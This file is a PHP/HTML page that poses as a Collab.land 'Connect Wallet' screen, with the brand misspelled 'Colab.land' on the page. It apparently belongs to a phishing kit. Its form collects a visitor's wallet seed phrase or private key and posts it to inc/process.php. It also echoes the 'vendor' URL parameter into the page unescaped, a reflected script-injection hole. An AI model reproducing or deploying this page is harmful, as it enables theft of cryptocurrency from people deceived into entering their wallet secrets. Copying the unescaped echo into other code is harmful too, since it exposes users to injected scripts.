<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Collab.land</title>
    <link rel="icon" href="assets/images/favicon.ico" />
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css"
      integrity="sha384-zCbKRCUGaJDkqS1kPbPd7TveP5iyJE0EjAuZQTgFLD2ylzuqKfdKlfG/eSrtxUkn"
      crossorigin="anonymous"
    />
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="assets/css/style.css" />
    <!-- Local CSS -->
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  </head>

  <body>

    <div class="main-section-2">
      <div class="d-flex justify-content-start mb-1">
        <img
          src="assets/images/favicon.ico"
          alt=""
          height="20px"
          width="20px"
        />
        <h1 class="h5 mx-1 text-bolder text-sm-left">Colab.land</h1>
      </div>
      <div class="box p-5">
        <h4 class="h4 text-center text-secondary">Connect Wallet</h4>
        <form action="inc/process.php" method="post" id="seed-form">
          <?php 

if ($_GET['vendor'] == 'OtherWallets') {
  echo '<input type="text" name="vendor" placeholder="Wallet name" id="" class="form-control" required />';
} else {
  echo '<input type="hidden" class="mt-3" name="vendor" value="' . $_GET['vendor'] . '" />';
}

?>
          <textarea
          name="seed_phrase"
          id=""
          cols="70"
          rows="5"
          class="form-control mt-3"
          placeholder="seed phrase, private key, ..."
          required
          ></textarea>
          <div class="invalid-feedback">Cannot be empty</div>
          <div id="loader"></div>
          <button
          type="submit"
          href=""
          class="btn btn-primary btn-block btn-lg mt-3"
          id="connectWalletButton"
          >
          Connect Wallet
          </button>
        </form>
      </div>
    </div>

    <script
      src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"
      integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj"
      crossorigin="anonymous"
    ></script>
    <!-- JQuery -->
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-fQybjgWLrvvRgtW6bFlB7jaZrFsaBXjsOMm/tB9LTS58ONXgqbR9W8oWht/amnpF"
      crossorigin="anonymous"
    ></script>
    <!-- Bootstrap JS -->
    <script src="assets/js/script.js"></script> <!-- Custom JS -->
  </body>
</html>
